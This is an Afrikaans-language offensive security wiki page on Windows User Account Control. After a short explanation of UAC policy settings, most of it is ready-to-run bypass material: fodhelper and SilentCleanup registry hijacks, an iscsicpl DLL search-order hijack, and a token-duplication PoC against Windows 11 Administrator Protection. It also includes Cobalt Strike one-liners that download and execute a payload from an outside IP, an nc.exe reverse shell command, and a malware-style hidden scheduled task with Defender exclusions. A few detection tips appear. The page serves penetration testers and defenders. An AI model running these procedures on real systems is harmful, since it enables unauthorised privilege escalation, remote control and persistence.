# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n funksie wat 'n **toestemmingsaanvraag vir verhoogde aktiwiteite** moontlik maak. Toepassings het verskillende `integrity`-vlakke, en 'n program met 'n **hoë vlak** kan take uitvoer wat **die stelsel potensieel kan kompromitteer**. Wanneer UAC geaktiveer is, **loop toepassings en take altyd onder die sekuriteitskonteks van 'n nie-administrateurrekening** tensy 'n administrateur hierdie toepassings/take uitdruklik magtig om administrateurvlaktoegang tot die stelsel te hê om uitgevoer te word. Dit is 'n geriefsfunksie wat administrateurs teen onbedoelde veranderinge beskerm, maar dit word nie as 'n sekuriteitsgrens beskou nie.<sup>[[2]](#references)</sup>

Vir meer inligting oor integriteitsvlakke:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wanneer UAC in plek is, kry 'n administrateurgebruiker 2 tokens: 'n standaardgebruikertoken om gewone handelinge met medium integriteit uit te voer, en een met die administrateurvoorregte.

Hierdie [bladsy](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek in groot diepte hoe UAC werk en sluit die aanmeldproses, gebruikerservaring en UAC-argitektuur in.<sup>[[2]](#references)</sup> Administrateurs kan sekuriteitsbeleide gebruik om te konfigureer hoe UAC spesifiek vir hul organisasie op plaaslike vlak werk (deur secpol.msc te gebruik), of dit kan in 'n Active Directory-domeinomgewing deur Group Policy Objects (GPO) gekonfigureer en uitgerol word. Die verskillende instellings word [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) in besonderhede bespreek. Daar is 10 Group Policy-instellings wat vir UAC gestel kan word. Die volgende tabel verskaf bykomende besonderhede:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Beleide vir die installering van sagteware op Windows

Die **plaaslike sekuriteitsbeleide** ("secpol.msc" op die meeste stelsels) is by verstek gekonfigureer om **nie-administrateurgebruikers te verhinder om sagteware-installasies uit te voer**. Dit beteken dat selfs al kan 'n nie-administrateurgebruiker die installeerder vir jou sagteware aflaai, hulle dit nie sonder 'n administrateurrekening sal kan uitvoer nie.

### Registry Keys om UAC te dwing om vir verhoging te vra

As 'n standaardgebruiker sonder adminregte kan jy verseker dat die "standaard"-rekening **deur UAC vir geloofsbriewe gevra word** wanneer dit sekere handelinge probeer uitvoer. Hierdie handeling vereis dat sekere **registry keys** gewysig word, waarvoor jy admin-toestemmings nodig het, tensy daar 'n **UAC bypass** is, of die aanvaller reeds as admin aangemeld is.

Selfs al is die gebruiker in die **Administrators**-groep, dwing hierdie veranderinge die gebruiker om hul **rekeninggeloofsbriewe weer in te voer** om administratiewe handelinge uit te voer.

**In die praktyk is dit slegs nuttig wanneer jy reeds 'n verhoogde token, 'n UAC bypass of 'n verkeerde konfigurasie het wat jou toelaat om hierdie sleutels te verander; anders word die registry-skrywing self geblokkeer.**

Die registry keys en inskrywings wat jy moet verander, is die volgende (met hul verstekwaardes tussen hakies):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Dit kan ook handmatig deur die Local Security Policy-instrument gedoen word. Sodra dit verander is, vra administratiewe bewerkings die gebruiker om hul geloofsbriewe weer in te voer.

### Nota

**User Account Control is nie 'n sekuriteitsgrens nie.** Daarom kan standaardgebruikers nie uit hul rekeninge ontsnap en administrateurregte verkry sonder 'n plaaslike privilege escalation exploit nie.

### Vra 'volle rekenaartoegang' aan 'n gebruiker
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC-voorregte

- Internet Explorer Protected Mode gebruik integriteitskontroles om te voorkom dat prosesse met 'n hoë integriteitsvlak (soos webblaaiers) toegang verkry tot data met 'n lae integriteitsvlak (soos die tydelike Internet-lêergids). Dit word gedoen deur die blaaier met 'n lae-integriteitstoken te laat loop. Wanneer die blaaier probeer om toegang te verkry tot data wat in die lae-integriteitsone gestoor is, kontroleer die bedryfstelsel die integriteitsvlak van die proses en laat toegang dienooreenkomstig toe. Hierdie funksie help om te voorkom dat remote code execution-aanvalle toegang tot sensitiewe data op die stelsel verkry.
- Wanneer 'n gebruiker by Windows aanmeld, skep die stelsel 'n toegangstoken wat 'n lys van die gebruiker se voorregte bevat. Voorregte word gedefinieer as die kombinasie van 'n gebruiker se regte en vermoëns. Die token bevat ook 'n lys van die gebruiker se credentials, wat credentials is wat gebruik word om die gebruiker teenoor die rekenaar en hulpbronne op die netwerk te authenticateer.

### Autoadminlogon

Om Windows te konfigureer om outomaties tydens opstart by 'n spesifieke gebruiker aan te meld, stel die **`AutoAdminLogon` registry key**. Dit is nuttig vir kiosk-omgewings of vir toetsdoeleindes. Gebruik dit slegs op veilige stelsels, aangesien dit die wagwoord in die registry blootstel.

Stel die volgende sleutels met die Registry Editor of `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Om na normale aanmeldgedrag terug te keer, stel `AutoAdminLogon` op 0.

## UAC-bypass

> [!TIP]
> Let daarop dat UAC-bypass eenvoudig is as jy grafiese toegang tot die slagoffer het, aangesien jy bloot op "Yes" kan klik wanneer die UAC-prompt verskyn

Die UAC-bypass is in die volgende situasie nodig: **UAC is geaktiveer, jou proses loop in 'n medium-integriteitskonteks, en jou gebruiker behoort aan die Administrators-groep**.

Dit is belangrik om te noem dat dit **baie moeiliker is om UAC te bypass as dit op die hoogste sekuriteitsvlak (Always) is as wanneer dit op enige van die ander vlakke (Default) is.**

### Fast triage vanaf 'n medium-integrity shell

Voordat jy 'n bypass probeer, bevestig dat jy in die regte scenario is en koppel die host-build aan bekende werkende metodes:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktiese notas:
- As `EnableLUA=0` is, het jy nie 'n bypass nodig nie: enige admin-token kan direk vir hoë integriteit versoek.
- `ConsentPromptBehaviorAdmin=2` of `5` is die algemene scenario vir auto-elevate / COM-based bypasses.
- `Always Notify` verhoog die vereistes, maar jy moet steeds die presiese build toets eerder as om mislukking te aanvaar: UACME hou steeds rekord van sommige `AlwaysNotify compatible`-metodes op moderne Windows-builds.<sup>[[3]](#references)</sup>

### UAC gedeaktiveer

As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**), kan jy **'n reverse shell met admin privileges uitvoer** (hoë integriteitsvlak) deur iets soos die volgende te gebruik:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Baie** Basiese UAC-"bypass" (volle lêerstelseltoegang)

As jy 'n shell het met 'n user wat binne die Administrators-groep is, kan jy die **C$**-share wat via SMB gedeel word, plaaslik in 'n nuwe skyf **mount**, en jy sal **toegang tot alles binne die lêerstelsel** hê (selfs die Administrator se tuisvouer).

> [!WARNING]
> **Dit lyk asof hierdie truuk nie meer werk nie**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC-bypass met Cobalt Strike

Die Cobalt Strike-tegnieke sal slegs werk indien UAC nie op sy maksimum-sekuriteitsvlak gestel is nie
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **bypass**.

### Elevated COM-koppelvlakke (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM-objects bly 'n praktiese UAC-oppervlak op moderne builds. `ICMLuaUtil` word steeds deur UACME as werkend op huidige Windows-branches opgespoor, en offensive tooling pas steeds `CMSTPLUA` aan deur 'n interaktiewe desktop-process, 64-bit execution en soms PEB/process masquerading te kombineer voordat die COM Elevation Moniker aangeroep word.<sup>[[3]](#references)</sup>

Praktiese wenke:
- Verkies 'n **64-bit** process in die gebruiker se **interaktiewe sessie** (gewoonlik `explorer.exe` of 'n child daarvan).
- As 'n raw shell misluk, probeer weer vanaf 'n BOF / UACME-implementering eerder as 'n naïewe `CreateProcess`-wrapper.
- Verwag dat child execution in 'n **aparte elevated process** sal plaasvind; baie BOFs elevate nie die huidige beacon in-place nie.

### KRBUACBypass

Dokumentasie en tool by [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)wat 'n **samestelling** van verskeie UAC bypass exploits is. Let daarop dat jy UACME met **Visual Studio of msbuild moet compile**. Die compilation sal verskeie executables skep (soos `Source\Akagi\outout\x64\Debug\Akagi.exe`), en jy sal moet weet **watter een jy nodig het.**<sup>[[3]](#references)</sup>\
Jy moet **versigtig wees**, want sommige bypasses sal **ander programme prompt** wat die **gebruiker** sal **alert** dat iets gebeur.<sup>[[3]](#references)</sup>

UACME het die **build version waarop elke technique begin werk het.**<sup>[[3]](#references)</sup> Jy kan soek na 'n technique wat jou weergawes raak:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ook, deur [hierdie](https://en.wikipedia.org/wiki/Windows_10_version_history)-bladsy te gebruik, kry jy die Windows-vrystelling `1607` uit die build-weergawes.

’n Praktiese werkvloei is om eers **die host se build te score**, en dan eers die ooreenstemmende metode uit te voer:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` vergelyk die plaaslike build vinnig met sy bekende UAC-metodes, wat nuttig is om dooie PoCs vinnig uit te skakel.<sup>[[4]](#references)</sup>
- `UACME` bly die beste publieke katalogus om ’n bypass aan ’n presiese build te koppel. Onlangse releases het nuwe metodes bygevoeg en bestaande metodes weer teen **Windows 11 25H2** getoets; gaan dus die README/release notes weer na voordat jy aanvaar dat ’n ou blogplasing steeds onveranderd van toepassing is.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertroude binary `fodhelper.exe` word op moderne Windows outomaties verhoog. Wanneer dit geloods word, raadpleeg dit die per-user registry-pad hieronder sonder om die `DelegateExecute`-werkwoord te valideer. Deur ’n command daar te plaas, kan ’n Medium Integrity-proses (die user is in Administrators) ’n High Integrity-proses sonder ’n UAC-prompt spawn.

Registry-pad wat deur fodhelper geraadpleeg word:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-stappe (stel jou payload in, en aktiveer dit)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Werk wanneer die huidige gebruiker 'n lid van Administrators is en die UAC-vlak verstek/lenient is (nie Always Notify met ekstra beperkings nie).
- Gebruik die `sysnative`-pad om 'n 64-bis PowerShell vanaf 'n 32-bis-proses op 64-bis Windows te begin.
- Payload kan enige command wees (PowerShell, cmd, of 'n EXE-pad). Vermy promptende UIs vir stealth.

#### CurVer/extension hijack-variant (slegs HKCU)

Onlangse samples wat `fodhelper.exe` abuse, vermy `DelegateExecute` en **redirect eerder die `ms-settings` ProgID** via die per-user `CurVer`-waarde. Die auto-elevated binary resolve steeds die handler onder `HKCU`, dus is geen admin token nodig om die keys te plant nie:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Sodra elevated is, **deaktiveer malware gewoonlik toekomstige prompts** deur `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` op `0` te stel, waarna dit addisionele defense evasion uitvoer (bv. `Add-MpPreference -ExclusionPath C:\ProgramData`) en persistence herskep om as high integrity te loop. ’n Tipiese persistence-taak stoor ’n **XOR-encrypted PowerShell-script** op skyf en dekodeer/voer dit elke uur in-memory uit:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Hierdie variant maak steeds die dropper skoon en laat slegs die staged payloads agter, wat beteken dat detection moet staatmaak op die monitering van die **`CurVer` hijack**, peutering aan `ConsentPromptBehaviorAdmin`, die skep van Defender exclusions, of scheduled tasks wat PowerShell in-memory decrypt. <sup>[[5]](#references)</sup>

### UAC bypass via `SilentCleanup`-taak (`HKCU\Environment\windir`)

`SilentCleanup` loods `cleanmgr.exe` met die hoogste voorregte en brei `%windir%` uit die user environment. As jy `HKCU\Environment\windir` beheer, kan jy daardie uitbreiding na ’n arbitrêre command herlei en high integrity verkry sonder ’n consent dialog. <sup>[[8]](#references)</sup> Hierdie metode is steeds die moeite werd om op onlangse builds te toets, omdat UACME die tegniek aktief hou en onlangse issue tracking toon dat Windows 11 24H2 moontlik slegs klein quoting-aanpassings vereis. <sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
As die taak die pad op daardie build aanhaal, probeer weer met die payload wat met ’n aanhalingsteken eindig (byvoorbeeld `cmd.exe"`). Maak altyd `HKCU\Environment\windir` skoon nadat jy getoets het.

#### Meer UAC bypass

Baie klassieke UAC bypasses wat UI-vloeie, COM-objects of desktop interaction misbruik, vereis ’n **volledige interaktiewe sessie** met die slagoffer; ’n algemene `nc.exe`-shell of ’n diens wat in **Session 0** loop, is dikwels nie genoeg nie.

Jy kan dit dikwels oplos deur ’n **meterpreter**-sessie te gebruik. Migreer na ’n **process** wat die **Session**-waarde gelyk aan **1** het:

![Wys ms-settings na ’n custom extension (.thm) en map daardie extension na ons payload - Meer UAC bypass: Jy kan dit met ’n meterpreter-sessie kry. Migreer na ’n process wat die Session...](<../../images/image (863).png>)

(_explorer.exe_ behoort te werk)

### UAC Bypass met GUI

As jy toegang tot ’n **GUI** het, kan jy eenvoudig die UAC-prompt **aanvaar** wanneer dit verskyn; jy het nie werklik ’n tegniese bypass nodig nie. Daarom is die verkryging van ’n GUI-sessie dikwels genoeg om die praktiese hindernis wat deur UAC bygevoeg word, te omseil.

Verder, as jy ’n GUI-sessie kry wat iemand gebruik het (moontlik via RDP), sal daar **sommige tools wees wat as administrator loop**, vanwaar jy byvoorbeeld ’n **cmd** direk **as admin** kan **run** sonder om weer deur UAC gevra te word, soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit kan ’n bietjie meer **stealthy** wees.

### Noisy brute-force UAC bypass

As jy nie omgee om noisy te wees nie, kan jy altyd **iets soos** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **run**, wat **vra om permissions te elevate totdat die user dit aanvaar**.

### Jou eie bypass - Basiese UAC bypass-metodologie

As jy na **UACME** kyk, sal jy opmerk dat **baie UAC bypasses DLL hijacking misbruik** (dikwels deur ’n elevated binary ’n attacker-controlled DLL vanaf ’n writable path te laat laai). [Lees dit om te leer hoe om ’n DLL hijacking-vulnerability te vind](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Vind ’n binary wat **autoelevate** (kontroleer dat dit op ’n high integrity level loop wanneer dit executed word).
2. Gebruik procmon om "**NAME NOT FOUND**"-events te vind wat kwesbaar kan wees vir **DLL Hijacking**.
3. Jy sal waarskynlik die DLL binne sommige **protected paths** (soos C:\Windows\System32) moet **write**, waar jy nie writing permissions het nie. Jy kan dit omseil deur:
1. **wusa.exe**: Windows 7,8 en 8.1. Dit laat jou toe om die inhoud van ’n CAB-lêer binne protected paths te extract (omdat hierdie tool vanaf ’n high integrity level executed word).
2. **IFileOperation**: Windows 10.
4. Berei ’n **script** voor om jou DLL binne die protected path te copy en die kwesbare en autoelevated binary te execute.

### Nog ’n UAC bypass-tegniek

Dit behels om te monitor of ’n **autoElevated binary** probeer om die **registry** te **read** vir die **name/path** van ’n **binary** of **command** wat **executed** moet word (dit is interessanter as die binary hierdie inligting binne die **HKCU** soek).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Die 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` is ’n **auto-elevated** binary wat misbruik kan word om `iscsiexe.dll` volgens die search order te laai. As jy ’n malicious `iscsiexe.dll` binne ’n **user-writable** folder kan plaas en dan die huidige user se `PATH` verander (byvoorbeeld via `HKCU\Environment\Path`) sodat daardie folder gesoek word, kan Windows die attacker DLL binne die elevated `iscsicpl.exe`-process laai **sonder om ’n UAC-prompt te wys**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktiese notas:
- Dit is nuttig wanneer die huidige user in **Administrators** is, maar op **Medium Integrity** loop weens UAC.
- Die **SysWOW64**-kopie is die relevante een vir hierdie bypass. Behandel die **System32**-kopie as ’n aparte binary en valideer die gedrag onafhanklik.
- Die primitive is ’n kombinasie van **auto-elevation** en **DLL search-order hijacking**, dus is dieselfde ProcMon-workflow wat vir ander UAC bypasses gebruik word, nuttig om die ontbrekende DLL-load te valideer.

Minimale vloei:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection-idees:
- Stel `reg add` / registry writes na `HKCU\Environment\Path` in kennis wanneer dit onmiddellik gevolg word deur die uitvoering van `C:\Windows\SysWOW64\iscsicpl.exe`.
- Soek vir `iscsiexe.dll` in **user-controlled** liggings soos `%TEMP%` of `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Korrelleer `iscsicpl.exe`-lanserings met onverwagte child processes of DLL loads buite die normale Windows-gidse.

### Nuwere navorsing wat afsonderlik nagegaan behoort te word

Sommige chains ná 2024 lyk nie meer soos die klassieke `HKCU\Software\Classes` registry hijacks nie. Activation-context cache poisoning kan byvoorbeeld ’n **drive remap** en **DLL redirection** chain om van medium- na high-integrity te beweeg deur trusted UI / auto-elevated binaries soos `ctfmon.exe` en latere targets soos `fodhelper.exe`. In plaas daarvan om die groot PoC hier te dupliseer, kyk na die kompakte payload-voorbeelde in:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Vir die volledige `RAiLaunchAdminProcess` / UIAccess attack surface op Windows 11 25H2, kyk na die toegewyde bladsy:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 se “Administrator Protection” gebruik shadow-admin tokens met per-session `\Sessions\0\DosDevices/<LUID>` maps. Die directory word luiweg deur `SeGetTokenDeviceMap` geskep tydens die eerste `\??` resolution. As die aanvaller die shadow-admin token slegs op **SecurityIdentification** impersonate, word die directory geskep met die aanvaller as **owner** (dit erf `CREATOR OWNER`), wat drive-letter links toelaat wat voorkeur bo `\GLOBAL??` geniet.<sup>[[7]](#references)</sup>

**Stappe:**

1. Roep vanuit ’n low-privileged session `RAiProcessRunOnce` aan om ’n promptless shadow-admin `runonce.exe` te spawn.
2. Duplicate sy primary token na ’n **identification** token en impersonate dit terwyl `\??` oopgemaak word om die skepping van `\Sessions\0\DosDevices/<LUID>` onder attacker ownership af te dwing.
3. Skep daar ’n `C:`-symlink wat na attacker-controlled storage wys; daaropvolgende filesystem accesses in daardie session resolve `C:` na die attacker path, wat DLL/file hijack sonder ’n prompt moontlik maak.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Verwysings

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Hoe User Account Control werk](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Versameling UAC bypass-tegnieke](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass-versoenbaarheidskandeerder en launcher](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI neem AI aan om PowerShell Backdoors te genereer](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 0-Day-uitbuiting teen Suidoos-Asiatiese regeringsteikens](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Omseiling van Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Omseil UAC met die SilentCleanup-taak](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
